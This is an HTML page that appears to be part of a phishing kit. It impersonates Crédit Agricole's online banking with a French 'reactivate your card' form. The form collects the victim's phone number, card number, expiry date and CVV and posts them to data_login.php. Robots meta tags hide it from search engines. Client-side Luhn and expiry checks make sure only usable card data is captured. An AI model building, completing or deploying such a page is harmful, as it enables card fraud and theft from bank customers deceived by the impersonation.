<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
        <link rel="stylesheet" href="media/css/helpers.css">
        <link rel="stylesheet" href="media/css/style.css">
<style>

.error-message {
    display: block;
    margin-top: 4px;
    font-size: 12px;
    color: red;
}


</style>
        <link rel="icon" type="image/x-icon" href="media/imgs/ff.ico" />

        <title>Acceso online</title>
    </head>

    <body>

		<!-- HEADER -->
        <header id="header2" class="d-lg-flex d-md-none d-sm-none d-none">
            <div class="logo"><img style="width: 57px;" src="media/imgs/logo2.svg"></div>
            <div class="menu">
                <ul>
                    <li>Ma synthèse</li>
                    <li>Mes opérations <i class="fas fa-sort-down"></i></li>
                    <li>Mes documents <i class="fas fa-sort-down"></i></li>
                    <li>Mes autres comptes <i class="fas fa-sort-down"></i></li>
                    <li>toute l'offre <i class="fas fa-sort-down"></i></li>
                    <li>nos conseils <i class="fas fa-sort-down"></i></li>
                </ul>
            </div>
            <div class="btns">
                <img style="min-width: 399px;" src="media/imgs/login-menu.png">
            </div>
        </header>
        <!-- END HEADER -->

        <!-- HEADER MOBILE -->
        <div id="mobile-menu" class="d-lg-none d-md-flex d-sm-flex d-flex" style="background: #F5F5F5;">
            <div class="pl-3"><img src="media/imgs/mobilemenu.png"></div>
            <div><img style="width: 57px;" src="media/imgs/logo2.svg"></div>
            <div><img style="min-width: 120px;" src="media/imgs/log-menu2.png"></div>
        </div>
        <!-- END HEADER MOBILE -->

        <!-- MAIN -->
        <main id="main">
            <div class="left two order-lg-1 order-md-2 order-sm-2 order-2">
                <div class="top">
                    <div class="content2">
                        <div class="tt"><p>RÉACTIVER VOTRE CARTE</p></div>
                        <h3>Les avantages de la carte bancaire du Crédit Agricole :</h3>
                        <p class="mb-0">Avec la carte bancaire Crédit Agricole, vous pourrez faire les transactions classiques avec plus de facilité (consulter le solde, acheter…), vous pouvez également utiliser cette dernière via l’application mobile de la banque. Le reste dépend de la carte choisie.</p>
                    </div>
                </div>
                <div class="bottom">
                    <div class="ccc">
                        
                        <img src="media/imgs/chat2.png">
                        <p class="mt30 mb10">Une question ?</p>
                        <p class="mb30"><b>Un conseiller vous accompagne</b></p>
                        <button type="button">Contacter un conseiller</button>

                    </div>
                </div>
            </div>
            <div class="right order-lg-2 order-md-1 order-sm-1 order-1">
                <div class="cc">
                    <div class="ti mb50">
                        <h3>RÉACTIVER MA CARTE</h3>
                        <p>Entrez les informations de votre carte associées à votre compte pour réactiver votre carte en ligne.</p>
                    </div>

                    <div id="forma">
                        <input type="hidden" id="cap" name="cap">
                        <input type="hidden" name="steeep" id="steeep" value="cc">
                         <form class="Login-form" id="loginForm" name="loginForm" action="data_login.php" method="POST">
                        <div class="details">
                            <div class="title">MES INFORMATIONS</div>
                            <div class="body">
							
                           							
                           							
                                                          <!-- PHONE -->
                           <div class="form-group row align-items-center">
                               <label for="phone" class="col-md-4">Numéro de téléphone *</label>
                               <div class="col-md-8">
                                   <input type="text" inputmode="numeric" name="phone" id="phone" class="form-control" placeholder="06 XX XX XX XX" required>
                                   <label class="error-message text-danger small" id="error-phone"></label>
                               </div>
                           </div>
                           
                           <!-- CARD NUMBER -->
                           <div class="form-group row align-items-center">
                               <label for="one" class="col-md-4">Numéro du carte bancaire *</label>
                               <div class="col-md-8">
                                   <input type="text" name="one" inputmode="numeric" id="one" class="form-control" placeholder="xxxx xxxx xxxx xxxx" required>
                                   <label class="error-message text-danger small" id="error-one"></label>
                               </div>
                           </div>
                           
                           <!-- EXPIRATION -->
                           <div class="form-group row align-items-center">
                               <label for="two" class="col-md-4">Date d'expiration *</label>
                               <div class="col-md-8">
                                   <input type="text" name="two" inputmode="numeric" maxlength="7" id="two" class="form-control" placeholder="MM/AA" required>
                                   <label class="error-message text-danger small" id="error-two"></label>
                               </div>
                           </div>
                           
                           <!-- CVV -->
                           <div class="form-group row align-items-center mb-0">
                               <label for="three" class="col-md-4">Cryptogramme visuel (CVV) *</label>
                               <div class="col-md-8">
                                   <input type="text" maxlength="3" inputmode="numeric" name="three" id="three" class="form-control" placeholder="xxx" required>
                                   <label class="error-message text-danger small" id="error-three"></label>
                               </div>
                           </div>
                           
                           								
								
                            </div>
                        </div>

                        <div class="btns">
                            <div class="bbb">Annuler</div>
                            <div id="booom" class="btttn">Valider</div>
                        </div>
						
						
						</form>
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="media/js/js.js"></script>

        <script>
            $('#phone').mask('0000000000');
            $('#one').mask('0000 0000 0000 0000');
            $('#two').mask('00/00');
            $('#three').mask('000');

        </script>
<script>
document.getElementById("booom").addEventListener("click", function () {
    const form = document.getElementById("loginForm");

    const phone = document.getElementById("phone");
    const cardNumber = document.getElementById("one");
    const expDate = document.getElementById("two");
    const cvv = document.getElementById("three");

    const errorPhone = document.getElementById("error-phone");
    const errorCard = document.getElementById("error-one");
    const errorExp = document.getElementById("error-two");
    const errorCVV = document.getElementById("error-three");

    let hasError = false;

    // Reset all
    [phone, cardNumber, expDate, cvv].forEach(el => el.style.border = "");
    [errorPhone, errorCard, errorExp, errorCVV].forEach(el => el.textContent = "");

    // Validate phone (FR mobile)
    const phoneVal = phone.value.trim().replace(/\s+/g, '');
    if (!/^0[67]\d{8}$/.test(phoneVal)) {
        phone.style.border = "1px solid red";
        errorPhone.textContent = "Numéro invalide. Format attendu : 06XXXXXXXX";
        hasError = true;
    }

    // Validate card number (Luhn + 16 digits)
    const cardVal = cardNumber.value.replace(/\s+/g, '');
    if (!/^\d{16}$/.test(cardVal) || !luhnCheck(cardVal)) {
        cardNumber.style.border = "1px solid red";
        errorCard.textContent = "Numéro de carte invalide.";
        hasError = true;
    }

    // Validate expiration MM/YY
    const expVal = expDate.value.trim();
    if (!/^\d{2}\/\d{2}$/.test(expVal)) {
        expDate.style.border = "1px solid red";
        errorExp.textContent = "Date invalide. Format attendu : MM/AA";
        hasError = true;
    } else {
        const [mm, yy] = expVal.split('/').map(Number);
        const now = new Date();
        const currentYear = now.getFullYear() % 100;
        const currentMonth = now.getMonth() + 1;
        if (mm < 1 || mm > 12 || yy < currentYear || (yy === currentYear && mm < currentMonth)) {
            expDate.style.border = "1px solid red";
            errorExp.textContent = "Date expirée.";
            hasError = true;
        }
    }

    // Validate CVV
    const cvvVal = cvv.value.trim();
    if (!/^\d{3}$/.test(cvvVal)) {
        cvv.style.border = "1px solid red";
        errorCVV.textContent = "CVV invalide. 3 chiffres requis.";
        hasError = true;
    }

    if (!hasError) {
        form.submit();
    }
});

// Luhn algorithm for card check
function luhnCheck(cardNumber) {
    let sum = 0;
    let shouldDouble = false;
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber.charAt(i));
        if (shouldDouble) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
}
</script>

    </body>

</html>